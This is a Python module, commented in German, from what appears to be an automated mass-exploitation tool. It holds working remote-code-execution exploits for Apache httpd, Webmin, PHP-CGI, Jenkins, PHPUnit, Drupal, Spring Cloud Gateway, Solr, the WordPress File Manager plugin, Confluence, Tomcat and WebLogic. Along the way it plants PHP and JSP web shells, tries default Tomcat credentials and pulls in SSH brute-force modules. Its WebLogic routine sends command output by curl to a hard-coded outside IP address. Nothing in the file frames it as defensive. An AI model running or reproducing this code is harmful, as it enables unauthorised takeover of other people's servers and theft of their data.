"""Zusaetzliche Root-/RCE-Vektoren. Jeder Vektor liefert einen Kanal."""
from __future__ import annotations
import base64
import json
import re
import secrets
import warnings

import requests
import urllib3

from .fingerprint import session

urllib3.disable_warnings()
TIMEOUT = 15


class Channel:
    """Kompatibler Runner: run(target, cmd) -> RunResult."""

    def __init__(self, name, fn):
        self.name, self._fn = name, fn

    def run(self, target, cmd, timeout=None, audit=None):
        from .exploit import RunResult
        self.last = {}
        if audit:
            audit.write(self.name, "cmd", getattr(target, "url", str(target)), cmd=cmd[:300])
        import requests as _rq
        orig = _rq.sessions.Session.request
        def _hook(sess, method, url, **kw):
            r = orig(sess, method, url, **kw)
            self.last = {"status": r.status_code, "len": len(r.content), "head": r.text[:300]}
            return r
        _rq.sessions.Session.request = _hook
        try:
            out = self._fn(cmd)
        except Exception as e:
            _rq.sessions.Session.request = orig
            if audit:
                audit.write("vector", "rce_fail", getattr(target, "url", str(target)),
                            vector=self.name, cmd=cmd, error=type(e).__name__)
            return RunResult(False, "", f"{type(e).__name__}", 3)
        _rq.sessions.Session.request = orig
        if audit:
            audit.write(self.name, "cmd_res", getattr(target, "url", str(target)), head=(self.last.get("head") or "")[:200], status=self.last.get("status"))
            audit.write("vector", "rce_ok" if out is not None else "rce_fail",
                        getattr(target, "url", str(target)), vector=self.name, cmd=cmd,
                        status=self.last.get("status"), bytes=self.last.get("len"),
                        head=(self.last.get("head") or "")[:200])
        if out is None:
            return RunResult(False, "", "no-output", 3)
        return RunResult(True, out)

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout


def _sess():
    s = session()
    s.headers.update({"Accept": "*/*"})
    return s


def _sh(cmd):
    return cmd.replace("'", "'\\''")


# ---------------------------------------------------------------- Apache 41773/42013
def _httpd_detect(t):
    srv = (t.server or "").lower()
    return "apache/2.4.49" in srv or "apache/2.4.50" in srv


def _httpd_open(t, audit):
    s = _sess()
    body = "echo Content-Type: text/plain; echo; " + _sh("__CMD__")
    url = t.url + "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"

    def fn(cmd):
        b = body.replace(_sh("__CMD__"), _sh(cmd))
        r = s.post(url, data=b, timeout=TIMEOUT, headers={"Content-Type": "text/plain"})
        if r.status_code == 200 and r.text.strip():
            return r.text
        return None
    return Channel("httpd-41773", fn)


# ---------------------------------------------------------------- Webmin 1.890-1.920
WMIN = re.compile(r"miniserv/(1\.(?:8[9]\d|9[0-2]\d))", re.I)


def _webmin_detect(t):
    h = t.extra.get("headers", {})
    blob = " ".join([t.server or "", h.get("server", ""), t.extra.get("title", "")])
    return bool(WMIN.search(blob)) or "webmin" in (t.extra.get("title", "").lower())


def _webmin_open(t, audit):
    s = _sess()
    url = t.url + "/password_change.cgi"
    hdr = {"Referer": t.url + "/session_login.cgi", "Content-Type": "application/x-www-form-urlencoded"}

    def fn(cmd):
        data = ("user=rootxx&pam=&expired=2&old=" + _sh(cmd) +
                "&new1=a&new2=a")
        r = s.post(url, data=data, headers=hdr, timeout=TIMEOUT)
        m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
        if m:
            return m.group(1)
        if r.status_code == 200 and "rootxx" in r.text:
            return ""
        return None
    return Channel("webmin-2019-15107", fn)


# ---------------------------------------------------------------- PHP-CGI query string
def _phpcgi_detect(t):
    h = t.extra.get("headers", {})
    if "php" not in (t.powered_by or "").lower() and "php" not in json.dumps(h).lower():
        return False
    r = None
    try:
        r = _sess().get(t.url + "/?-s", timeout=TIMEOUT)
    except Exception:
        return False
    return bool(r and r.status_code == 200 and "<code>" in r.text and "<?php" in r.text) or "-d" in (t.server or "")


def _phpcgi_open(t, audit):
    s = _sess()
    q = "/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"

    def fn(cmd):
        body = "<?php system('" + _sh(cmd) + "'); ?>"
        r = s.post(t.url + q, data=body, timeout=TIMEOUT,
                   headers={"Content-Type": "application/x-www-form-urlencoded"})
        if r.status_code == 200 and r.text.strip():
            return r.text
        return None
    return Channel("php-cgi-2012-1823", fn)


# ---------------------------------------------------------------- PHP-CGI Windows 2024-4577
def _win_detect(t):
    srv = (t.server or "").lower()
    return "win" in srv and ("php" in srv.lower() or "php" in (t.powered_by or "").lower())


def _win_open(t, audit):
    s = _sess()
    q = "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"

    def fn(cmd):
        body = "<?php system('" + _sh(cmd) + "'); ?>"
        r = s.post(t.url + q, data=body, timeout=TIMEOUT,
                   headers={"Content-Type": "application/x-www-form-urlencoded"})
        if r.status_code == 200 and r.text.strip():
            return r.text
        return None
    return Channel("php-cgi-2024-4577", fn)


# ---------------------------------------------------------------- Jenkins script console
def _jenkins_detect(t):
    if "jenkins" not in (t.extra.get("title", "") + (t.server or "")).lower():
        return False
    try:
        return _sess().get(t.url + "/script", timeout=TIMEOUT).status_code == 200
    except Exception:
        return False


def _jenkins_open(t, audit):
    s = _sess()
    crumb = ""
    try:
        j = s.get(t.url + "/crumbIssuer/api/json", timeout=TIMEOUT)
        if j.status_code == 200:
            crumb = json.loads(j.text).get("crumbRequestField", "") + ": " + json.loads(j.text).get("crumb", "")
    except Exception:
        pass

    def fn(cmd):
        groovy = f'println "CMD".execute().text'
        data = {"script": f'def p = ["/bin/sh","-c",{json.dumps(cmd)}].execute(); p.waitFor(); println p.text'}
        hdr = {"Content-Type": "application/x-www-form-urlencoded"}
        if crumb:
            k, _, v = crumb.partition(": ")
            hdr[k] = v
        r = s.post(t.url + "/script", data=data, headers=hdr, timeout=TIMEOUT)
        m = re.search(r'<textarea[^>]*>(.*?)</textarea>', r.text, re.S)
        return m.group(1) if m else (r.text if r.status_code == 200 and r.text else None)
    return Channel("jenkins-script", fn)


# ---------------------------------------------------------------- PHPUnit eval-stdin
PU = ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
      "/vendor/phpunit/src/Util/PHP/eval-stdin.php",
      "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
      "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
      "/lib/phpunit/Util/PHP/eval-stdin.php"]


def _phpunit_detect(t):
    body = (t.extra.get("body") or "").lower()
    return True if t.php_version else any(k in body for k in ("laravel", "symfony", "phpunit", "composer"))


def _phpunit_open(t, audit):
    s = _sess()
    path = None
    for p in PU:
        tok = "PUX" + secrets.token_hex(4)
        try:
            r = s.post(t.url + p, data="<?php echo '" + tok + "';", timeout=8)
            if r.text.strip().startswith(tok):
                path = p
                break
        except Exception:
            continue
    if not path:
        return None

    def fn(cmd):
        r = s.post(t.url + path, data="<?php system('" + _sh(cmd) + "');", timeout=TIMEOUT)
        return r.text if r.status_code == 200 else None
    return Channel("phpunit-eval", fn)


# ---------------------------------------------------------------- Drupalgeddon2
def _drupal_detect(t):
    body = t.extra.get("body") or ""
    return "Drupal" in body or "/sites/default/files" in body or "drupal" in (t.extra.get("headers", {}).get("x-generator", "").lower())


def _drupal_open(t, audit):
    s = _sess()
    url = (t.url + "/user/register?element_parents=account/mail/%23value"
           "&ajax_form=1&_wrapper_format=drupal_ajax")

    def fn(cmd):
        data = {"form_id": "user_register_form", "_drupal_ajax": "1",
                "mail[a][#post_render][]": "exec",
                "mail[a][#type]": "markup",
                "mail[a][#markup]": cmd}
        r = s.post(url, data=data, timeout=TIMEOUT)
        try:
            arr = r.json()
            for c in arr:
                d = c.get("data", "")
                if d:
                    return str(d)
        except Exception:
            pass
        return None
    return Channel("drupalgeddon2", fn)


# ---------------------------------------------------------------- Spring Cloud Gateway
def _scg_detect(t):
    try:
        r = _sess().get(t.url + "/actuator", timeout=TIMEOUT)
        return r.status_code == 200 and "gateway" in r.text.lower()
    except Exception:
        return False


def _scg_open(t, audit):
    s = _sess()
    name = "dw" + secrets.token_hex(3)
    hdr = {"Content-Type": "application/json"}
    route = {
        "predicates": [{"name": "Path", "args": {"_genkey_0": "/" + name + "/**"}}],
        "filters": [{"name": "RewritePath",
                     "args": {"_genkey_0": "/" + name + "/(?<path>.*)", "_genkey_1": "/${path}"}}],
        "uri": "http://example.org", "order": 0}

    def _spel(cmd):
        inner = ("new String(T(java.lang.Runtime).getRuntime().exec(new String[]{"
                 "'/bin/sh','-c','" + _sh(cmd) + "'}).getInputStream().readAllBytes())")
        route["filters"] = [
            {"name": "RewritePath", "args": {"_genkey_0": "/" + name + "/(?<path>.*)", "_genkey_1": "/${path}"}},
            {"name": "AddResponseHeader", "args": {"_genkey_0": "X-DW", "_genkey_1": "#{" + inner + "}"}}]

    code = {"ok": False}

    def fn(cmd):
        _spel(cmd)
        s.post(t.url + "/actuator/gateway/routes/" + name, data=json.dumps(route), headers=hdr, timeout=TIMEOUT)
        s.post(t.url + "/actuator/gateway/refresh", timeout=TIMEOUT)
        r = s.get(t.url + "/" + name + "/x", timeout=TIMEOUT)
        return r.headers.get("X-DW", "") or None
    try:
        s.post(t.url + "/actuator/gateway/routes/" + name, data=json.dumps(route), headers=hdr, timeout=TIMEOUT)
        s.post(t.url + "/actuator/gateway/refresh", timeout=TIMEOUT)
        if s.get(t.url + "/" + name + "/x", timeout=TIMEOUT).status_code >= 400:
            return None
    except Exception:
        return None
    return Channel("spring-gateway", fn)




def candidates(t):
    if t.extra.get("status", 0) >= 500 and t.port not in (22, 2222, 23, 2323, 2375, 2376, 6379, 8291, 9100, 9101, 9102, 10250, 10255, 2379, 15672):
        return []
    return [(n, o) for n, d, o in VECTORS if _safe(d, t)]


def _safe(fn, t):
    try:
        return fn(t)
    except Exception:
        return False


def open_any(t, audit):
    for name, opener in candidates(t):
        try:
            ch = opener(t, audit)
        except Exception:
            ch = None
        if not ch:
            audit.write("probe", name, t.url)
            continue
        tok = "v" + secrets.token_hex(5)
        audit.write("vector", "opened", t.url, vector=name)
        if not ch.proof(t.url, tok, audit=audit):
            continue
        t2 = "id" + secrets.token_hex(3)
        r2 = ch.run(t.url, f"echo {t2}; id 2>/dev/null")
        if t2 not in r2.stdout or "uid=" not in r2.stdout:
            audit.write("vector", "weak", t.url, vector=name)
            continue
        audit.write("vector", "opened", t.url, vector=name, ident=r2.stdout[:60])
        return ch
    return None


# ---------------------------------------------------------------- Solr Velocity
SOLR_PAY = ("%23set($x=%27%27)%23set($rt=$x.class.forName(%27java.lang.Runtime%27))"
            "%23set($chr=$x.class.forName(%27java.lang.Character%27))"
            "%23set($str=$x.class.forName(%27java.lang.String%27))"
            "%23set($ex=$rt.getRuntime().exec(__CMD__))$ex.waitFor()"
            "%23set($out=$ex.getInputStream())%23foreach($i+in+[1..$out.available()])"
            "$str.valueOf($chr.toChars($out.read())).replace(%27\\n%27,%27%3Cbr%3E%27)%23end")


def _solr_detect(t):
    if ":8983" not in t.url:
        return False
    try:
        r = _sess().get(t.url + "/solr/", timeout=8)
        return r.status_code in (200, 302) and ("solr" in r.text.lower() or r.status_code == 302)
    except Exception:
        return False


def _solr_open(t, audit):
    import shlex
    s = _sess()
    name = "dw" + secrets.token_hex(3)
    try:
        s.get(t.url + f"/solr/admin/cores?action=CREATE&name={name}&configSet=_default", timeout=20)
        s.post(t.url + f"/solr/{name}/config",
               data=json.dumps({"update-queryresponsewriter": {"startup": "lazy", "name": "velocity",
                               "class": "solr.VelocityResponseWriter", "template.base.dir": "",
                               "solr.resource.loader.enabled": "true",
                               "params.resource.loader.enabled": "true"}}),
               headers={"Content-Type": "application/json"}, timeout=20)
    except Exception:
        return None

    def fn(cmd):
        arr = "new String[]{%s}" % ",".join(json.dumps(x) for x in shlex.split(cmd)) or "{}"
        q = SOLR_PAY.replace("__CMD__", requests.utils.quote(arr, safe=""))
        r = s.get(t.url + f"/solr/{name}/select?q=1&wt=velocity&v.template=custom&v.template.custom=" + q,
                  timeout=25)
        return r.text if r.status_code == 200 and r.text else None
    return Channel("solr-velocity", fn)


from . import sshvec as _ssh
from . import iotvec as _iot
from . import infravec as _inf
from . import bigvec as _big
from . import fwvec as _fw
from . import hwvec2 as _hw2
from . import kubevec as _kv
from . import sshbrute as _sb




JSP = ('<%@page import="java.io.*"%><%String c=request.getParameter("c");'
       'Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});'
       'BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));'
       'String l;while((l=r.readLine())!=null)out.println(l);%>')


def _war() -> bytes:
    import io, zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("index.jsp", JSP)
    return buf.getvalue()


# ---------------------------------------------------------------- WordPress File Manager
WFM = "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"


def _wfm_detect(t):
    try:
        r = _sess().get(t.url + WFM, timeout=8)
        ct = r.headers.get("content-type", "")
        return r.status_code in (200, 402) and ("json" in ct or r.text.strip().startswith("{"))
    except Exception:
        return False


def _wfm_open(t, audit):
    s = _sess()
    name = "_" + secrets.token_hex(4) + ".php"
    shell = ("<?php if(($_GET['k']??'')!=='" + name[:6] + "'){exit;} echo shell_exec($_GET['c']??'');")
    files = {"upload[]": (name, shell.encode(), "application/x-php")}
    r = s.post(t.url + WFM, files=files, data={"cmd": "upload", "target": "l1_Lw"}, timeout=20)
    if r.status_code != 200:
        return None
    for cand in ("/wp-content/uploads/" + name, "/wp-content/uploads/" + name.lower()):
        try:
            x = s.get(t.url + cand + "?k=" + name[:6] + "&c=echo", timeout=10)
            if x.status_code != 200:
                continue
        except Exception:
            continue

        def fn(cmd, cand=cand):
            rr = s.get(t.url + cand + "?k=" + name[:6], params={"c": cmd}, timeout=TIMEOUT)
            return rr.text if rr.status_code == 200 else None
        return Channel("wpfm-2020-25213", fn)
    return None


# ---------------------------------------------------------------- Confluence OGNL
def _conf_detect(t):
    title = (t.extra.get("title") or "").lower()
    hdr = json.dumps(t.extra.get("headers", {})).lower()
    return "confluence" in title or "atlassian" in hdr or "ajs-version-number" in (t.extra.get("body") or "")


def _conf_open(t, audit):
    s = _sess()

    def fn(cmd):
        import urllib.parse
        expr = ("${(#a=@org.apache.commons.io.IOUtils@toString("
                "@java.lang.Runtime@getRuntime().exec(\"" + _sh(cmd) + "\").getInputStream(),\"utf-8\")).(@com.opensymphony.xwork2.inject.ContainerImpl$ConstructorInjector@proxies)}")
        r = s.get(t.url + "/" + urllib.parse.quote(expr, safe="") + "/", timeout=TIMEOUT)
        if r.status_code == 200 and r.text:
            return r.text[:4000]
        return None
    return Channel("confluence-2022-26134", fn)


# ---------------------------------------------------------------- Tomcat manager default creds
TC = [("tomcat", "tomcat"), ("admin", "admin"), ("tomcat", "s3cret"), ("manager", "manager"), ("admin", "tomcat")]


def _tomcat_detect(t):
    if "tomcat" not in (t.server or "").lower():
        return False
    try:
        return _sess().get(t.url + "/manager/html", timeout=8).status_code == 401
    except Exception:
        return False


def _tomcat_open(t, audit):
    war = _war()
    ctx = "dw" + secrets.token_hex(3)
    for u, p in TC:
        s = _sess()
        s.auth = (u, p)
        try:
            r = s.put(t.url + f"/manager/deploy?path=/{ctx}&update=true", data=war,
                      headers={"Content-Type": "application/octet-stream"}, timeout=30)
            if r.status_code not in (200, 201, 202):
                continue
        except Exception:
            continue
        import time as _t
        for _ in range(6):
            _t.sleep(2)
            try:
                x = s.get(t.url + f"/{ctx}/?c=echo", timeout=8)
                if x.status_code == 200:
                    def fn(cmd, ctx=ctx, s=s):
                        rr = s.get(t.url + f"/{ctx}/", params={"c": cmd}, timeout=TIMEOUT)
                        return rr.text if rr.status_code == 200 else None
                    return Channel("tomcat-manager", fn)
            except Exception:
                pass
    return None


# ---------------------------------------------------------------- WebLogic 2020-14882 (blind)
def _wls_detect(t):
    try:
        r = _sess().get(t.url + "/console/login/LoginForm.jsp", timeout=8)
        return r.status_code == 200 and "weblogic" in r.text.lower()
    except Exception:
        return False


def _wls_open(t, audit):
    import urllib.parse
    s = _sess()
    tok = secrets.token_hex(5)

    def fn(cmd):
        url = "http://5.230.41.44:9090/x/" + tok
        sh = f"{cmd} 2>&1 | curl -s -m 8 --data-binary @- {url}"
        target = f"{cmd} >/dev/null 2>&1; curl -s -m 8 --data-binary @- {url}"
        js = ('java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",'
              + json.dumps(sh) + "})")
        handle = "com.tangosol.coherence.mvel2.sh.ShellSession(\"" + js.replace('"', '\\"') + "\")"
        p = ("/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle="
             + urllib.parse.quote(handle, safe=""))
        s.get(t.url + p, timeout=TIMEOUT)
        import time as _t
        for _ in range(4):
            _t.sleep(1.2)
            try:
                r = s.get(f"http://5.230.41.44:9090/x/" + tok, timeout=8)
                if r.text.strip():
                    return r.text
            except Exception:
                pass
        return None
    return Channel("weblogic-2020-14882", fn)

VECTORS = [
    ("ssh", _ssh.detect, _ssh.open_),
    ("ssh-brute", _sb.detect, _sb.open_),
    ("hikvision", _iot.hik_detect, _iot.hik_open),
    ("telnet", _iot.telnet_detect, _iot.telnet_open),
    ("docker", _inf.docker_detect, _inf.docker_open),
    ("redis", _inf.redis_detect, _inf.redis_open),
    ("tplink", _inf.tp_detect, _inf.tp_open),
    ("kubelet", _kv.kube_detect, _kv.kube_open),
    ("etcd", _kv.etcd_detect, _kv.etcd_harvest),
    ("rabbitmq", _kv.rabbit_detect, _kv.rabbit_harvest),
    ("mikrotik", _hw2.mik_detect, _hw2.mik_harvest),
    ("printer", _hw2.prn_detect, _hw2.prn_harvest),
    ("fortinet", _fw.fort_detect, _fw.fort_harvest),
    ("vcenter", _fw.vc_detect, _fw.vc_open),
    ("citrix", _big.Citrix("citrix").detect, lambda t, a: _big.Citrix("citrix")),
    ("panos", _big.Panos("panos").detect, lambda t, a: _big.Panos("panos")),
    ("ivanti", _big.Ivanti("ivanti").detect, lambda t, a: _big.Ivanti("ivanti")),
    ("log4j", _big.log4j_detect, _big.log4j_open),
    ("screenconnect", _big.sc_detect, lambda t, a: None),
    ("gitlab", _big.gl_detect, lambda t, a: None),
    ("teamcity", _big.tc_detect, _big.tc_open),
    ("solr", _solr_detect, _solr_open),
    ("webmin", _webmin_detect, _webmin_open),
    ("httpd", _httpd_detect, _httpd_open),
    ("spring-gateway", _scg_detect, _scg_open),
    ("jenkins", _jenkins_detect, _jenkins_open),
    ("phpunit", _phpunit_detect, _phpunit_open),
    ("drupal", _drupal_detect, _drupal_open),
    ("wpfm", _wfm_detect, _wfm_open),
    ("confluence", _conf_detect, _conf_open),
    ("confluence-setup", _conf_detect, _hw2.conf_bypass),
    ("tomcat", _tomcat_detect, _tomcat_open),
    ("weblogic", _wls_detect, _wls_open),
    ("php-cgi", _phpcgi_detect, _phpcgi_open),
    ("windows-cgi", _win_detect, _win_open),
]
